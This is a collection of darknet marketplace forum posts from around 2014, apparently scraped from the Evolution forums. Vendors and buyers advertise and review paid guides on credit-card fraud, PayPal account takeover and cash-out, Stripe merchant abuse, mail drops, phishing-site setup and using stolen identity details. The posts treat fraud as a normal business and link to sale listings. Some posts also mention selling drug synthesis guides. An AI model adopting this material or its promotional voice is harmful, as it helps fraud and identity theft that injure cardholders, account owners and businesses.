Good method, i've personally done this a bunch of times in the past and it works flawlessly. This method is perfect for people new to fraud.

At the end of the day there will ALWAYS be this problem. You will have vendors who sell regurgitated rubbish or sell information that is widely available and free. Why? Because people will buy it and some people are too lazy to seek the information themselves. Those who buy and are not happy with their purchase because they already have the guide or knew the information - it's their own fault because ideally you should quiz the vendor before the purchase.  I agree with you about ""step one, step two, step three"" guides. If you look through my posts you will see that I have voiced my opinion on this before. In fact, when vendors have sent me their guide and it's been in the mentioned format I have mentioned this in my review and advised the vendor improve it's contents as I would not consider what they are selling a ""guide"". Buyers should be aware that sometimes the information will be rubbish - it's evident by the price tag that follows. You pay $10 you expect to receive junk.",""

Although I appreciate the positive review of my guide, I'm aware that there are other very good guide writers here, but they cannot make as much money as they'd like to because of ""make 20,000 per week"" guides. Some people join TCF / Evo all excited about getting in the carding world, pay $100 to purchase a guide to get started, and receive a 2-page PDF file written like shit that gives no useful information. They then lose confidence in good and genuine guides and eventually fade away. This shouldn't be. I agree with the gatekeeper idea. It's easy to make newbie accounts and say ""Vouched!"" in the threads just to boost your own sales. A better security mechanism should be put in place.",""
"Evolution Forums","nabokovo","21188","2014-08-26T17:43:56","Re: I'm So Sick of Evolution's Fraud Related Guides & Tutorials","Guides Vendors","I definitely like the idea of a gate keeper/mod / someone experienced, honest and most of all independent (which is near impossible?) to review some guides so potential buyers know what to buy. Are the ""bad"" (It's subjective, sure) guides any more than a simple scam, making the journey of beginners harder and demoralizing them? A quick look at the guides section shows hundreds of guides promising the same, from tens of different people at different prices. How could anybody inexperienced, looking for legitimate knowledge find out what's good and what not? More so when every guide is praised into heaven. Reviews and vouches on here are sometimes vague and more than often conflicting.To someone inexperienced, what does a review mean? We have to trust anonymous people (What can we go by?) which we can't verify as to having any credibility. Is a post count the only thing we can base legitimacy upon, besides sales and sale%? - But what about ""A place for the experienced sellers aswell as the new guy selling for the first time"". It's not as if we're expecting world renowned restaurant critics posting information about their latest restaurant visits, but hey... What about a rating system on individual items? (eg. 1-10 *)? -Thanks, Nabo.

"Evolution Forums","Prince_Oberyn","21188","2014-08-23T00:52:40","I'm So Sick of Evolution's Fraud Related Guides & Tutorials","Guides Vendors","Most vendors write guides that promise you to make 1000$ or whatever amount of money per week/ month and 99% of these guides are complete bullshit and terribly written. They either steal information from other more expensive guides or free guides from the clearnet and TCF and their description of the marketplace listing is completely misleading. Additionally, they almost always forget to mention which components you will need to set up everything correctly (drop, burner phone, fake ID, SE skills, whatever). Example Of A Shitty Evolution GuideHow to make 20,000$ in one dayStep 1: Get CarStep 2: Get GunStep 3: Rob BankStep 4: Drive Away What's even worse is that most of these guides are outdated and/ or will get saturated within a few days/ weeks since most of these methods are just links to websites that you can abuse until they up their security or shut down their service completely.I think this is absolutely fucked up and unacceptable to newbies trying to get into the carding game, as well as veterans looking for new ways to expand their methods.I'm not a newbie, nor one of the victims who fall for all of these useless guides/hidden wiki scams, but I'm still pissed off because I think so highly of evolution as a marketplace and community. Therefore, I think the admins should do something about it. Perhaps they could have a mod or a member with a high reputation act as a gatekeeper to review the guides prior to being published. This is just an idea. Maybe someone could come up with something better. I just think that something should definitely be done about this. In my humble opinion, the only guides worth buying that have personally taught me A LOT of valuable information that is 100% useful and worth every penny are: 1. Moka's Four Horseman, Beginner's CVV to Paypal and Jungle Money2. Ucard's Get Your Own Item/ Mail Drop (Not perfect imo, but very clever and it seems to help a lot of people on this forum)3. Alpha02's Carder Science 4. Yasuo's Receiving & Cashing Out Paypal Guide (although it would be nice to get the updated v4.5, but I respect why Yasuo doesn't want to release it) 5. Yasuo's Ultimate Social Engineering guide6. Yasuo's Free Security & Anonymity Guide7. Alpha89's Chiseling PayPal Transfers [Building|Maintaining|Cashing] 8. And of course TCF which is not a guide per se, but more of a pool of useful information to dig through.... if I've forgotten one good guide do let me know. If nothing will change on here, I will eventually write a comprehensive guide with 100+ pages of original and illustrated content dedicated to complete newbies, so they don't have to buy your piece of shit excuse of a newbie guide collection or useless tutoring efforts. I might give it away for free depending on how much time and effort it'll take me to write it, but if I decide to put a price tag on it, it will be very affordable that's for sure. Don't get me wrong, I like money too, that's why I'm here, but so many of you are a bunch of greedy fucks it makes me sick to my stomach!

The v4.5 was supposedly save clients who wasted $250 with v3.0, but then the cocky guy decided not to sell it.I also think Yasuo's other persona, is that guy on TCF back on december who was selling a CVV to BTC method at $200, which finally resulted in another super cute designed shitty guide about buying MMO Gold. The same techinique was widely available in other forums at the time. This guy also made the promess of updating the guide to v2 and then he vanished for scamming people with v2 and all resulted in nothing! I bet then he became in Yasuo and learned some lessons about not scamming people. You just need to learn one thing from Yasuo: Learning Photoshop could bring you big-big money!5. Yasuo's Ultimate Social Engineering guideNothing you cannot find on leaked.sx. The lazy people, can just buy this guide for $100.6. Yasuo's Free Security & Anonymity GuideGood. Is free! Like above guide should be!7. Alpha89's Chiseling PayPal Transfers [Building|Maintaining|Cashing]Awesome guide and totally original content, it really helped too much people, including the most advanced users.8. And of course TCF which is not a guide per se, but more of a pool of useful information to dig through.TCF kind of died for months after they started charging entrance fee. Now is trying to revive and all just thanks to the new moderator.But there wouldn't exist EVO if before didn't exist TCF.

That would help me a lot"" and someone will register on forum and make only one post... Well, we all know it's suspicious.

Even If you work 16hr/day you won't get closer $500 either because you are selling a product in an over saturated market and everybody is doing it very cheap... and your earnings don't depend on you, depend on others buying your content, and also even if someone buys from you, you'll have to work for it.Don't waste your money on this, even if you have 10$ to spare... and that's my opinion."

The easy way to explain the process without giving everything away, you will be referring tons of accounts to your main account and keeping them logged in. You will have access and control to not only your main account but also the referral account so you make twice the cash! Takes a little time to set up accounts, maybe a couple of days or so, but once you're all set up you will be extremely happy. Any questions feel free to contact me! Let's make some easy cash friends:) Link to my posting:           http://k5zq47j6wd3wdvjq.onion/listing/18614 My feedback for old guide:  http://k5zq47j6wd3wdvjq.onion/user/feedback  Also a quote from 'Final' where he took his time to vouch for my guide!! Also the answer to the only question he had from me:)  One other review I just received for the old version of my guide is from a user named Beeker this should help your hesitation too friends!     Stand by for more guides from me in the future, all legal ways to make money and very cheap:)

Wouldn't we need a new IP for each instance?;Ohman wrote:No sir, the purpose of running the sandboxes is to keep it from noticing that you're the same IP:) It creates new instances that don't actually show up to the website as the same IP! You can also use different addons on Chrome to achieve the same thing as the sandboxes(like multi-login for Chrome for instance), but in my opinion it seems that Chrome multiple instances actually lag the computer more than the sandboxes, so I'd say go with the sandboxes IMO -- Opera Mobile is specifically the one I use and so far has gotten me the best results:)I really appreciate it final for taking the time out of your day to check my guide out and help a bro out. Please use the information and make yourself some bucks friend! See folks, all legit on my end, just trying to get some good information out to people! Feel free to message me with any questions, as I'll be around for a bit tonight yet until I go to bed!! Thanks again man.;Beeker wrote:Review:I bought this guide thinking its going to be full of BS. To my surprise, it works!I haven't been paid yet, but I've managed to ""recruit"" myself a few times and working my way to a payout. It is however, very repetitive and tedious. But once you get the initial setup going, its literally automated.It does take a few hours to setup, to hit max potential, but could easily be accomplished by hiring a VA or microworkers. Combine this with some carded advertisement, and you could be making easy money daily. A couple extra hundred a day is more than enough as a supplemental income stream.Other than the initial time it takes to setup, it more than pays off in the end. All in all, very good guide based on the ROI potential. Especially since the scalability of this is easy and actually recommended by the site owner.If you're looking to make some easy side cash doing nothing but keeping your PC on, then buy this guide.Beeker"

That might be your issue, you might think all 100 are logged in, but if their green meters aren't moving you aren't earning. They say you have to have the video running, but you don't, you only need to make sure the green meters are working. I use this every day man, how on earth would I be making money if it took 81 days to get just 50 bucks I wouldn't of even wasted time writing up this guide explaining how to refer accounts! You have to also make sure that they are all linked to your account with your referral link, I hope that isn't the problem otherwise some other issue arise. Like I said more than happy to help you figure it out, just wish we could have done that first instead of ranting:P Not sure if I sent you the new updated version of my guide yet, but it explains everything a lot more in detail that's this one I'm selling now, but it's free to past customers! It shows you more options then just the sand-boxing, it allows you now to use Google Chrome to log accounts in and it no longer will lag like it used to, because as long as you disable your flash add-on in Chrome you're able to still gain -- all that does is disable the video and chat so it doesn't lag your computer:)

Only a few to fund a OP I'm running real quick. If you purchased my last one, I'll offer a discount however this one is totally different. No need for the auto-pilot and listing creation process It's simply CC + Put Info Here = Get BTC.  Requirements: 1. Credit Card with all info SSN, DL# & address etc. ( There's people who supply this service ) 2. Sock5 and all that shit. 3. Patience, payout isn't instant but after a a little time you're Guaranteed to get you BTC. 4. Burner Phone or Google Voice Let's say you buy 5 CCV's, you run the method 5 different times charging amounts of 100$ to each one. After small amount of time has passed, you'll have 500$ BTC in 5 different wallets . I'm starting copies at 200$ then 300$ Then 400$ Then 500$ Then 600$ If an Admin/Mod would like a free copy I will provide, only on the terms you post here a review/vouch here. Again, all that is basically required is filling out (1) Form with your CC details successfully, after 1-3 Days you receive BTC.

The chances of saturation are extremely low. Had a long chat with a couple of people involved in this over the weekend after I decided to resell it, all agreed chances of saturation are pretty low. Especially as I've moved on from this method myself. But will still provide support for all buyers. As I have practical experience in this and have had great success. Certain ""vendors"" can't even keep their stories straight... Have they been doing their cash out for 4 months like they claim or did they say it was 2 months they'd been doing it, last Saturday?I've got 7 remaining of the 10 copies. http://k5zq47j6wd3wdvjq.onion/listing/3559It works, read the quotes, threads and feedback below.This method is easier for the UK market, but I do explain how to do this from abroad in the guide. You will need start up cash. So if you're down to your last $200 save it and buy something else.  All in all you can crack this for $300 including the price of the guide in that figure.You get out what you put in. Don't be fooled by certain get rich quick schemes sold on here or anywhere for this matter. If you want to earn $10,000 a week on this, you can. But you're going to be fucking busy. Although once it's set up the work is extremely easy. I myself, personally, wouldn't try that much.

I AM IN NO WAY AFFILIATED WITH ScoobyJew. You will only get an unbiased review from me. Doesn't mean that a free copy was provided, I will sugarcoat his guide. Nope. At least not in my reviews.METHOD = âââââFirst time I also encountered this method in the blackhat world. I've seen this method before in League Of Legends. It's not the same as the one used in LoL but the resource used was. Anyways, the method is clever. It offers a WIDE VARIETY of ways to make money. ScoobyJew listed down the main site to use and then a shitload of alternative sites. There are 2 ways to make money and I don't see any saturation at all. The only thing that could happen in the future is probably is tightened security but will still be doable. Honestly, I cannot see a saturation on this method any time soon.ORIGINALITY = âââââYup. 5/5. First time I encountered this. However, it doesn't 100% apply to where I am located right now. Would be perfect for Euro folks, other continents/countries can still benefit from it because ScoobyJew pointed out that it works worldwide. I tried it today and got $60+ already.USAGE = ââââ°â°I gotta give these 3/5 stars. First of all, it requires quite a bit of 'clean money' investment. It requires quite a bit of work to get serious cash. What I recommend, but is unnecessary, is to have a group for this. OVERALL = âââââ°4/5. $200 will be acquired back in 30 minutes tops. I've made $60 in seconds. Just go to your city grab hundreds of resources, stay at home and bam let the cash start to flow in. I asked ScoobyJew about the method because I'm not really familiar with these. He confirmed that everything is done anonymously as physical items are involved in this. Just physical item, no physical appearance involved at all. I really like it when a method involves 100% complete anonymity.PROS[â] Newbie-intermediate kind of a method.[â] Detailed guide.[â] The guide alone will answer most of your questions.[â] Small investment for medium initial returns.[â] ONE OF THE MOST UNDER-PRICED GUIDES![â] 100% ANONYMOUSCONS[â] Must have both quality and quantity resources to secure a good sum of cashout.[â] Sometimes, it might be done in a limited amount.[â] International customers cannot benefit from it 100%. Prolly around 90%.I DO NOT PROVIDE SUPPORT FOR THE GUIDE/METHOD I REVIEWED. HOWEVER, I CAN ANSWER SOME QUESTIONS IF I WANT TO."

It's very difficult for a newbie to  perform a full mdma synthesis whereas an mda synthesis is much easier and doable these days. It's also very powerful. I sold it for some time but took it down as I can't offer the same help I can with cocaine and wanted to focus more on that. I may offer it again sometime and the support if I ever get time from my cocaine guide. I also sent the information you requested.

OK, so I should really rip your post apart and defend myself as to why I am selling this guide, although I am not actually selling it, in fact it's not even written yet. So what I will say is it won't be sold 'for a few quids', in fact the starting price will likely be somewhere between 1-2 BTC which I consider substantially more than 'a few quids'.Also I won't be selling to to a bunch of 'sorry wankers on a dark net forum', because actually I have found that a lot of people who bought my guides before turned out to be sound people who I would actually end up calling friends, albeit ones who I would never know their real name or anything else about them. Lastly the method I have maybe re-discovered (because it was something I already knew about a long time ago but found an extra aspect to it to 're-ignite' it) would earn much more than 200 quid a day, in fact I am trying to see if it could make 4 figures in 1 day. A slight difference.   So, NTM93, maybe you want to 'fuck right off', I hope that was one of your quotes","NTM93 wrote:""potential for HUGE returns"" you say.

I thought the obvious vulnerability of the system is the entrance and exit nodes being controlled by the same entity. So I thought I would join the system. Its actually very interesting how the node system works. I am only at the stage of an exit node but I really liked the way the system tested my exit node as valid. I am not an expert but the relay system seems pretty sound besides having the entire NSA infrastructure after your blood. So has anyone else looked at the TOR system?

And at such a low price as well (considering you will make much more than that). Why? You do not know any of us to want to help us out, I'm sure you have a bunch family members or friends that could benefit from this. Why sell it for a few bitcoins that you could make in a short period of time and on top of that compromise this whole process and put it in risk of saturation.

And if you have to purchase some kind of anon visa, expect an investment of at least â¬60 to â¬80, that's a price I got from card sellers here on the market. DO NOTICE you'll only be able to pay it with a VISA card or MASTERCARD! Any other solution is useless. These are the only payment options there, no way around.All suggestions given to me won't work, okpay, paysafe, greendot (unless you're in the US), are a no go.Assuming Spendon is in fact a Visa card (which I do not know), it will cost you a minimum price of â¬70. Of course, you won't have a problem if you're not worried about your anonymity, and go all crazy using your own CC. Side note: Creating a domain outside the referred website (like I did, because of its cheaper price) will be useless, cause when you try to connect it to your phishing site, it will tell you that ""Connecting a domain to your site is a premium feature"", meaning you will still have to purchase that premium plan anyway, so no use in doing that.

Although all information is factual, unethical and is commonly talked about I'm surprise people still do it till this day. I'm just not so sure I would do it on a real account. If i did, saving myself from a negative would be my least of worries. I'd be more worried with the buyer taking me to court. For example, I think in 2010, there was a court case on one of those popular court tv shows that I remember watching where the seller used this method and the buyer took them to court. The judge laid it down on the defendant since its clear this person was acting out as a scam artist.  All I can say is if you use this guide use it at your own risk. If you tweak the guide you would reduce your chances of going to court tremendously, but your profit would be no where near $1000 a day.

But when I buy a guide that I immediately feel was worth every dime I paid for it, I want to tell the noobs about it. Iâve been reading every free guide on TCF, Evo and other deepweb sites that I can lay my hands on for the past five months. Iâve also bought numerous guides on Evo, and some of them taught me some valuable things, and some of them were disappointing for various reasons. Iâm not here to slag any vendor so Iâll keep the disappointing ones to myself. After buying some Paypal transfers from Makikaki today, I bought Makikakiâs PayPal CashOut/Middleman Accounts Obtaining and CashOut Guide. My only regret is that I didnât buy the guide BEFORE I bought the transfers.  Before I had even gotten through the first of six informative pages, I had already learned things that were well worth the $50.00 that I paid for it. It annoyed me that I didnât think of some of the things I read, but when youâre trying to learn so much so quickly, few people think of everything. You learn by doing: successes and failures. By the time I finished reading the entire guide, I kicked myself for not buying it sooner. For weeks Iâve been getting my Paypal game sorted, but no matter how much I read at Evo and TCF, I always had a nagging feeling in my gut that I still had questions that were unanswered. That distressing feeling is now gone. I now have to go back and fix some mistakes Iâve made, but at least now I know how to fix them correctly. For noobs looking to get into Paypal shenanigans, this guide is a must read. Or you can do what Iâve been doing before I bought this guide, keep fucking up and getting Paypal accounts locked when they didnât need to be.

A thorough explanation on how to set up your security, how to use the cards you'll be purchasing, and how to target potential card-able websites. How to find drops were the mail-man will  leave your items with no questions asked  a future update that goes in depth explanation of PayPal and it's inner-working And a-lot more is/will included, as taking over accounts and how to do  balance  transfers once you've taken over an account. What are balance transfers? Well, imagine being able to transfer the money from a credit card.. Into a Checking account, i guess you could call it a "" Bank Transfer "" in way.   What you will get when purchasing this, is a small batch of live cards. A reasonable amount of my time if you need any help with anything.

Than this, is simply... Not for you.    And I'm not selling a method I'm selling very precise knowledge. If you're referring to the balance transfers they can take anywhere from 1-5 days.

I will supply all documents needed for a succesfull apply.When you order my guide, I will supply unlimited scans so you can keep using it. Only 20 copies will be sold so I can keep everyone satisfied by sending them fresh scans.http://k5zq47j6wd3wdvjq.onion/listing/19818"

These acoustic emanations are more than a nuisance: they can conveyinformation about the software running on the computer, and in particular leak sensitive informationabout security-related computations. In a preliminary presentation (Eurocryptâ04 rump session), wehave shown that different RSA keys induce different sound patterns, but it was not clear how toextract individual key bits. The main problem was that the acoustic side channel has a very lowbandwidth (under 20 kHz using common microphones, and a few hundred kHz using ultrasoundmicrophones), many orders of magnitude below the GHz-scale clock rates of the attacked computers.In this paper we describe a new acoustic cryptanalysis key extraction attack, applicable toGnuPGâs current implementation of RSA. The attack can extract full 4096-bit RSA decryptionkeys from laptop computers (of various models), within an hour, using the sound generated by thecomputer during the decryption of some chosen ciphertexts. We experimentally demonstrate thatsuch attacks can be carried out, using either a plain mobile phone placed next to the computer, or amore sensitive microphone placed 4 meters away.Beyond acoustics, we demonstrate that a similar low-bandwidth attack can be performed bymeasuring the electric potential of a computer chassis. A suitably-equipped attacker need merelytouch the target computer with his bare hand, or get the required leakage information from theground wires at the remote end of VGA, USB or Ethernet cables.   anyone interested in technical details - drop me a PM.",""

WTF?! i had popped a couple xan bars before this ""interview"" to keep my cool and refused to answer any questions that would make me look guilty of any crimes i know they weren't bullshitting me about the IP thing because they showed me a paper provided to them by my former ISP with my true IP at that time, my former ISP gave them my info including old address and mobile phone #. they claimed to have all this knowledge of me accessing SR2 but they had no clue what i was doing on there, they didnt know my username and they didnt know anything i had ordered. every single order i made and all of the ""incriminating"" messages i had ever sent on SR2 were encrypted with 4096bit PGP. when SR2 was still active i had always used 2FA for login so even if they did have my username and pw, they would not be able to login (if that even matters, im not sure) for opsec i wont reveal everything this meeting included, im sure those bastards are watching these forums too. but it was a real fucking wakeup call, something went seriously wrong on SR2 over this past summer and i believe that many users identities may be in jeopardy. i was not a vendor on any market and really did not use SR2 that much for anything other than occasional personal sized orders. again they had no records of my orders, i think SR2 cleared them out after 30 days of finalization, they just wanted to know what i was doing on there - like i would admit to anything.... they had no warrant - arrest or search, i didnt let them through my front door. the meeting was very brief and i have not heard from them since that single encounter. it was a rough week in my life and hopefully i never have to see them again be careful guys

Dumb obviousy, but scary.  Personally I think they had another piece of info linking to the DNM's (confiscated package, word of mouth from a snitch) then used to get a warrant from his ISP provider.

There was a warning posted a few days before Christmas 2014 by a former SR2 moderator (Aries) which stated: ""... The infiltration of the market by law enforcement was much deeper than we originally believed now that the dust is beginning to settle. While the method used remains an unknown at this time, it appears they may have been able to extract user IPs that accessed the vendor URL...."" Remember that Cirrus has now been confirmed as an undercover agent, and it was Cirrus who published the SR2 vendor URL at the same time as DDOS attacks were being made on the main server. Perhaps this was a way to drive traffic to a vulnerable/compromised server to de-anonymize those who logged-in there.  Finally, from the affidavit in support of the arrest of DoctorClu, we can see the following:  11. I have spoken with a law enforcement agaent who accessed SR2 over an extended period of time. SR2 had a portion of its site that was only open to vendors. Between January 2014 and July 2014, a source of information provided law enforcement with particular IP addresses that had accessed the vendor portion of SR2....  Fantino

Let's assume that you encrypt a message to a vendor, with your name and address PGP-encrypted with the vendor's key, as well as your own.  Once that message is encrypted, only the holders of the private halves of the PGP keys can decrypt the message.  This means that they would have to bust you, or the vendor, and obtain your/their private half of the PGP key. (They would also have to force you (or the vendor) to hand over your passphrase, or use softwrae to guess it.)  For all practical purposes, that is the only way they can do it.

More good points, although they are somewhat mitigated by the low number of IPs actually collected. The number of knock-and-talks may have been a few as a half-dozen for each local office -- this would in no way have posed an undue burden, and would have made using this tactic more than worthwhile.

According to him the PP to BTC method in this guide is worth 100$ alone  Now you can get the whole package for the amazing price of 100$!  Only 5 days left buy this amazing package now for only 100$!","gory wrote:It's a very solid guide, newbie-friendly and detailed. The guide alone will answer most of your questions. Send quick!The service is excellent.  Really i vouch for him!!!;thechainring wrote:Thank you this package man its fantastic.  The other day I was so pissed off because I bought a guide from some one with out even thinking about positive feedback and reviews or anything that. I payed with my pay pal and I never received the guides. That was the first time I was on darknet.   So I was actually never going to come on here again but I knew there had to be legit people on here I talked to StrattonOakmont little and decided to get his guide. It is well worth it.  Thanks man you really turned my crappy first experience on here into something really great.;CanonballJoe wrote:OK, so I bought a copy (at a reduced price of $200 as I was quick off the mark). I bough this on the very first day, and have been wrestling with what to write ever since.Badger3 got it kind of right. If you are a noobie and want to know how to even go about taking Paypal for the run around, then this is a great guide. OP said he has been using the methods for the past month or so, and all of it was written from his own experiences etc, which I do agree with, I am sure he had been using thee methods for the past month... The only thing is, so has everyone else who knows what they are doing.If you have no idea how to set-up decent stealth/hacked accounts, and don't know how to clean your paypal money, then this guide will tell you how to do so, in very eloquent English (clear and concise with reasonings). The part of the guide where I believe he is basing this price, is his PP -> BTC Method. This is a good method and will work, but it is already well known by any veteran. That said, if you don't know of the method, then it is really useful and probably worth at least $100 alone.If I were to put a price on it, I would say $400 is quite steep. If you are a Veteran then you probably won't learn much new, but if you are new and want to get into carding, then this is one of the best guides for you to provide a decent income, but I would prefer if the guide was $100, $150 at a push. This is my honest opinion about the guide, if I were to review the Vendor specifically, I would rate him 10/10... When I complained he tried remedying the situation, and even sent me what could have been a great little bonus to smooth me over (but I already knew the method). He was very polite, respectful and it's clear he wants to be a top seller on EVO, so Kudos to him! If he was an ass then I wouldn't have finalized, but he seemed very genuine, and buying guides is a gamble anyway!!!Bulletpoints:+Noob Friendly+Easy to read and understand+Includes all key points of other guides for the whole process of PP fraud+Provides links to all materials/suppliers needed+Basically setup and go, you can earn back the cost of the guide in a few days if you're new to this+Great vendor, good conversation; genuinely wants to please his customers.-Overpriced IMO-Not useful for veterans (unless you don't know a 2 step PP->BTC method)-Not a NEW method, just a good compilation of known methods, with handy tips.;badger3 wrote:All around good read with useful information for 100% of readers from day1 who needs their hand held to those who have been in the game for a while.  Clear, concise english with proper grammar/vocabulary was a plus as were the diagrams (for those who haven't mastered reading yet).  Step by step explained in the format ""Do this BECAUSE OF/TO AVOID that.."" instead just ""Do that...now do this..."" etc.  Explained in a way that helps even a novice reader understand WHY to take steps in a certain direction.  Also instead of the usual ""You're going to need ""x"" before you get started+nothing"" Stratton laid it out as ""You're going to need ""x"" and Mr.M/This website is exactly where to find it..""  Good sources, good sites and worth every btc.  For the amount of information I would say he has the guide fairly priced as it would take 2,3,4 other guides to piece together all that's included here and of course a few new tidbits he's added of his personal methods.  Does my review matter to anyone?  Maybe, maybe not.  Is it completely objective?  100%.  I could try to say something like ""this is way undervalued, you should raise the price"" if I was a greedy fuck who wanted to keep the info to myself but honestly I can't see this getting saturated and just felt like giving credit where its due.  The way I see it, with authors like this sticking around, it makes competition that much steeper among those trying to make btc with guides which in the ends leads to an overall improvement of writing/guides altogether right?  I don't think anyone's going to pay some half assed half english speaking vendor 1 btc for a POS guide with hardly any legit info when they could get a guide 10x more clear with new information and solid sources for the same 1 btc.  Am I ""vouching"" for this guide?  Yeah, I vouch for it, whether anyone wants to take my word for it is up to you.  Nobody knows me and ive got about 10 posts or something so take how you want, but good job with this write-up Stratton I'll keep in touch."

If you're using tor, I would use Tails or some other linux VM within Virtualbox for that, so you can tunnel it through your VPNs.

I'm not affiliated to MH9 in any way, nor have I received any money / favor to write this review. That being said, this is going to be an honest review from my side.-----------------------------------------------------------------------------------------------------------------------WritingThe quality of a guide is discerned by the style how it's written, and also, how readable is it. In this guide MH uses the Times New Roman font, which as you all know, is the easiest to read. The font size is large, and the guide is dissected into small paragraphs,  for easy reading. All in all, apart from 1-2 grammatical errors, the guide is easy to read and understand, as it's written in spoken English, and no high level vocabulary has been used.-----------------------------------------------------------------------------------------------------------------------MethodYou might agree with me that the Stripe method has been around for quite a while and is being heavily abused.  Although those at TCF initiated with Stripe using E N Z O's guide, which provides a good idea to what Stripe is all about, MH9's guide is meant for newbies. This guide is really, I mean, really well explained, with links to the various tools you might need. It can be said that MH9 has left no stone unturned while writing this guide.  Everything, from setting up a website, setting up an account, the process all in all is covered in this guide.-----------------------------------------------------------------------------------------------------------------------Conclusion MH9 is a trusted member. I can say that this guy knows exactly what he's doing.Although this guide would not be suitable for the advanced carders, I still definitely recommend buying this guide, if you are just starting with Stripe.-----------------------------------------------------------------------------------------------------------------------Ratings Writing : âââââMethod :  For newbies : âââââFor advanced carders : âââââ Final rating : âââââ (A must buy for newbies)-----------------------------------------------------------------------------------------------------------------------arcana.

If your like me and had no experience in website design this guide definately helps in conquering that daunting prospect for novices in that skill set, also the depth of information that is shown here is most definately alot more detailed and without a doubt more structured than any other guide i have seen or read on the market for Stripe. If like me you are tired of buying bullshit recycled guides from evo, then i will gladly inform you that this is not one of those guides, its clearly written full of knowledge, original in its own right, and has that straight forward to the point info that mountain high shows in all his guides.  My only concern is that instead of naming one of the sites that made the whole experience easier you could of listed a few to stop any saturation or red flags coming from that particular eccommerce site.. mind you this isnt necessarily going to be the case. but it would be good to have some variety on the sites as there are plenty of them available, Thats just my honest opinion  But all in all a top guide that eases some of the pain the stripe hustle gives,To anyone looking to get into stripe this is a must buy.. 10/10 in my book bro,  Stay safe -=Krypto=-",""

MH9 even underlines there a lot of dos and dont's, advice for creating and aging accounts versus buying established ones, lifting the 7 days withdrawal time, creating the websites, avoiding redflags, etc.My only advice would be, MH9, to add a couple more links, maybe emphasize a bit on bank drops sources, etc.  Remember, this is also a guide for noobs, so do not expect them all to know even Stripe's URL  ; add a little spoonfeeding, and it will be 100% complete.   Conclusion: One can definitely start Stripe only by reading and following the red lines in this tutorial. Don't be lazy, people, listen to MH9's advices, your business will be rock solid if DYI will be your main rule... Congratulations, Mountainhigh9, a job well done. Definitely vouch for it.",""

I don't remember ever seeing that, so immediately shut the laptop for the day. The next day I opened it and found that light was still on, I assume indicating the cam was in use, so I put a piece of tape over the cam lens. So today I open the laptop after putting the tape over it, and now the light indicator next to it is off, am I just being paranoid or is that some kind of surveillance type shit? I have never seen it on before, never use any programs that require it's use, and thought I had disabled it entirely long ago. /discuss please",""

Que bono?!? The powers-that-shouldn't-be! Assanges job was to release a whole lot of ho-hum reports, peppered with carefully selected ""communications"" from select nations leaders, that helped fuel the Arab spring. Assange himself claimed responsibility for starting it. First a 'people's revolution' by manipulating genuine greivances. Then imposed 'democracy' which allows 'your guy' to get in power via rigged (or not) elections. The US and her allies did very well out of Wikileaks!! (the lack of anything exposing Israel should be a strong clue) Snowden's job is as a gatekeeper. He tells us what we knew anyway (that we are being spied upon) but keeps the extent of it and the details of it, from us. His associations with Glenn Grenwald and Omidyar are a red light. Snowden is still NSA (in my opinion).

"Evolution Forums","whadafu","26705","2014-10-02T18:33:02","Multisig Guide Using Electrum Wallet","Security & Anonymity","Guide was not working at the signrawtransaction step. I'm researching how to do this properly, and I will post a revised guide semi-soon. For the time being, you can import your address to the bitcoin-qt client and simply follow the steps from the Evo wiki. I'll repaste the guide in an effort to get someone to help me with fixing it. I just haven't had the time latley. Here it is again  THE SINGRAWTRANSACTION STEP IS NOT WORKING PLEASE LET ME KNOW IF YOU HAVE A FIX Multisig Guide Using Electrum Wallet ââââââââââââââââââââââââââââââââ Contents IntroductionObtaining KeypairsAccount ConfigurationOrderingClaiming Funds Introductionââââââââââââââââââââââââââââââââ This is for those people that would like to use multisig, but choose to use the Electrum wallet insteatd of Bitcoin-QT/bitcoind. This is an adaption of the multisig guide from the Evo wiki (http://i25c62nvu4cgeqyz.onion/wiki/index.php?title=Multisig_Guide) for use with the Electrum wallet. Some parts are straight copy/paste, other parts are modified using my own words. To create this guide I have referenced this: 2-of-3 Escrow Example with Electrum by atweiden (CLEARNET LINK https://gist.github.com/atweiden/7272732),  Please feel free to suggest any changes necessary to make this guide more understandable, or to correct something that I may have done wrong. This tutorial will assume you're using the Electrum wallet (CLEARNET LINK https://electrum.org/), and that you are in the Electrum folder in your terminal. You do not need to download the entire blockchain ever while using the Electrum wallet.  Obtaining Keypairsââââââââââââââââââââââââââââââââ This section will explain how to create a new wallet and obtain a public-private bitcoin keypair using the Electrum wallet via the terminal. Start by creating a new wallet: Enter your encryption password: You will get an output with a list of addresses, we'll pick the first one '1AsVgaCKPRwgY3x4ENbioUnhkfDJruWo44'. To obtain the public key use the following command: You will get an output like this: The value identified as pubkey is the public key youâll need to set-up multisig on your account. Lastly, we need to obtain the private key associated with public key. To do so, use the following command and enter your password when prompted: The output of this command is the private key associated with your public key. You will need this private key in order to sign and release the funds from the multisig address, so make sure to keep it somewhere safe.  Account Configurationââââââââââââââââââââââââââââââââ Before youâll be able to accept/use multisig escrow, youâll have to specify your bitcoin public key and your payment/return bitcoin address. You can do so here: my evolution > settings > multisig. Note that the payment/return address should be a bitcoin address that belongs to you, i.e. an address in your bitcoin wallet. VendorsIf you wish to accept multisig escrow transaction, youâll need to configure so in your store settings (my evolution > store > settings). The default setting is to accept regular escrow only - change it to âmultisig onlyâ or âbothâ depending on your preference in order to accept multisig escrow for orders. Orderingââââââââââââââââââââââââââââââââ Ordering products using multisig escrow isnât really all too different from using regular escrow. First, deposit the appropriate amount into your evolution wallet using the default procedure. Once the funds have credited to your account balance, order the desired product as you normally would. In Step 3 you will have to option of selecting your preferred method of escrow, select âmultisigâ to use this form of escrow, and continue to place the order. Upon placing the order, funds (minus fees) will transfer from your evolution wallet to the multisig address that was generated. You can view the multisig address on the orders detail page.  Claiming FundsââââââââââââââââââââââââââââââââThis is the step that is not working on Electrum 1.9.8. Some possible workarounds are using this site for signing the transaction: https://coinb.in/#newTransaction, downloading the code and running it yourself offline, or using the bitcoin-qt client. Again this is only needed to sign the transaction, everything else can be done with the Electrum client. Everything that follows in this section is the original post that needs to be corrected. The last step about pasting the hex to evo remains unchanged.When the order is finalized, canceled, declined or split, the appropriate party (or both parties in case of split) can claim their funds. On the orders/sale details page there will have appeared a button underneath the multisig address reading âClaim Fundsâ. Press this button and follow the instructions on this page. Using the same terminal that we used to get public-private keypair, and in the Electrum folder, weâll sign the transaction in order to release your funds. On this page you will find a command similar to the following: Replace YOUR_PRIVATE_KEY with the private key we obtained in section 1 and copy the entire command. Now go to the terminal and first type: Next paste what was copied from Evo's 'Claim Funds' page, and add the option '-o' at the end making the entire command look like this: Upon submitting it will output something along the 